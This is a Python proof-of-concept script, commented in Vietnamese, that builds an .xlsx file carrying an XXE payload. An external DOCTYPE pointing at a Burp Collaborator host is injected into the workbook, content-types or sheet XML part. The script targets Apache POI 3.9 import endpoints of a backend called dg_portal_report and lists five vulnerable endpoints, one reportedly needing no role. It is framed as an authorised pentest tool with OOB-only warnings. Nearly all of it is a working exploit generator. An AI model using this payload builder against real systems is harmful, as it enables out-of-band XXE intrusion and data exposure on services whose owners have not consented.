#!/usr/bin/env python3
"""
Tao file .xlsx PoC chua payload XXE (test OOB qua Burp Collaborator)
de kiem tra cac endpoint import Excel dung Apache POI 3.9 khong hardening
trong backend dg_portal_report (xem audit-output/findings/_app-wide.md muc 7).

.xlsx thuc chat la 1 file zip chua nhieu XML part. Script nay tu build 1
workbook toi gian (1 sheet, 1 cell) va chen 1 DOCTYPE khai bao external DTD
vao 1 trong cac XML part - part nay se duoc Apache POI parse ngay khi app
goi new XSSFWorkbook(...)/WorkbookFactory.create(...)/ExcelUtils.toWorkbook(...),
tuc la TRUOC ca buoc validate business (VD check so luong sheet).

Dung external DTD (<!DOCTYPE foo SYSTEM "http://...">) thay vi entity rieng le
vi nhieu XML parser (bao gom Xerces - JAXP mac dinh cua JVM) se cho ket noi ra
ngoai de nap DTD ben ngoai ngay ca khi khong co entity nao duoc tham chieu ben
trong document - phu hop de test OOB (Collaborator) ma khong can biet truoc
document co dung entity o dau.

Dung:
    python make_xxe_xlsx.py <collaborator-domain> [--target workbook|content-types|sheet] [--out poc.xlsx]

Vi du:
    python make_xxe_xlsx.py abc123xyz.oastify.com
    python make_xxe_xlsx.py abc123xyz.oastify.com --target content-types --out poc2.xlsx

Sau khi co file, upload qua Burp Repeater (multipart/form-data, field "file")
toi 1 trong cac endpoint da xac nhan dinh loi (xem in ra o cuoi script), roi
bam "Poll now" trong tab Collaborator cua Burp.

CANH BAO: chi dung script nay trong pham vi pentest da duoc uy quyen. Chi test
OOB (Collaborator) truoc - KHONG thu doc file he thong that (file:///...) hay
payload "billion laughs" tren moi truong nghi la production truoc khi da xac
nhan OOB thanh cong va duoc phep leo thang.
"""
import argparse
import io
import zipfile

CONTENT_TYPES = """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Default Extension="xml" ContentType="application/xml"/>
  <Override PartName="/xl/workbook.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/>
  <Override PartName="/xl/worksheets/sheet1.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/>
</Types>
"""

ROOT_RELS = """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="xl/workbook.xml"/>
</Relationships>
"""

WORKBOOK_RELS = """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet1.xml"/>
</Relationships>
"""

SHEET1 = """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
  <sheetData>
    <row r="1"><c r="A1" t="str"><v>test</v></c></row>
  </sheetData>
</worksheet>
"""

WORKBOOK_CLEAN = """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"
          xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
  <sheets>
    <sheet name="Sheet1" sheetId="1" r:id="rId1"/>
  </sheets>
</workbook>
"""

XML_DECL = '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'

ENDPOINTS = [
    ("POST /api/v2/checklist/import", "KHONG can role gi (thieu @PreAuthorize/@VacRole)"),
    ("POST /api/v2/sci-ai/import", "can DSAI_PROJECT_CREATE/_ALL hoac DSAI_PROJECT_UPDATE/_ALL"),
    ("POST /api/v2/system-change-request/import", "can SYSTEM_CHANGE_REQUEST_CREATE/_ALL hoac _UPDATE/_ALL"),
    ("POST /api/v2/system-change-request/import-os", "can REPORT_CREATE/_ALL hoac REPORT_UPDATE/_ALL"),
    ("POST /api/v2/evaluation/{id}/import-result", "can EVALUATION_SELF_EVALUATE... hoac EVALUATION_CHECK..."),
]


def xxe_doctype(domain: str) -> str:
    return f'<!DOCTYPE foo SYSTEM "http://{domain}/xxe-dtd">\n'


def inject(xml_text: str, doctype: str) -> str:
    return xml_text.replace(XML_DECL, XML_DECL + doctype, 1)


def build_xlsx(domain: str, target: str) -> bytes:
    content_types, root_rels, workbook_rels = CONTENT_TYPES, ROOT_RELS, WORKBOOK_RELS
    sheet1, workbook = SHEET1, WORKBOOK_CLEAN
    doctype = xxe_doctype(domain)

    if target == "workbook":
        workbook = inject(workbook, doctype)
    elif target == "content-types":
        content_types = inject(content_types, doctype)
    elif target == "sheet":
        sheet1 = inject(sheet1, doctype)
    else:
        raise ValueError(f"target khong hop le: {target}")

    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("[Content_Types].xml", content_types)
        z.writestr("_rels/.rels", root_rels)
        z.writestr("xl/workbook.xml", workbook)
        z.writestr("xl/_rels/workbook.xml.rels", workbook_rels)
        z.writestr("xl/worksheets/sheet1.xml", sheet1)
    return buf.getvalue()


def main():
    ap = argparse.ArgumentParser(description="Tao file .xlsx PoC XXE (test OOB qua Burp Collaborator)")
    ap.add_argument("domain", help="Domain Collaborator lay tu Burp, VD: abc123xyz.oastify.com")
    ap.add_argument(
        "--target",
        choices=["workbook", "content-types", "sheet"],
        default="workbook",
        help="XML part nao se chua DOCTYPE payload (mac dinh: workbook = xl/workbook.xml, "
             "part nay chac chan duoc POI parse ngay khi mo workbook)",
    )
    ap.add_argument("--out", default="poc.xlsx", help="Ten file output (mac dinh: poc.xlsx)")
    args = ap.parse_args()

    data = build_xlsx(args.domain, args.target)
    with open(args.out, "wb") as f:
        f.write(data)

    print(f"[+] Da tao {args.out} ({len(data)} bytes) - payload chen vao part: {args.target}")
    print(f'[+] DOCTYPE: <!DOCTYPE foo SYSTEM "http://{args.domain}/xxe-dtd">')
    print("[+] Upload file nay qua Burp Repeater, multipart/form-data, field name = \"file\", toi 1 trong:")
    for ep, role in ENDPOINTS:
        print(f"      {ep}  ({role})")
    print("[+] Sau khi gui, mo tab Collaborator trong Burp -> \"Poll now\" de xem co DNS/HTTP interaction khong.")
    print("[!] Neu co --target khac nhau khong ra ket qua, thu lai voi --target content-types hoac --target sheet.")


if __name__ == "__main__":
    main()
#python make_xxe_xlsx.py <domain-collaborator-lấy-từ-burp> --out poc.xlsx
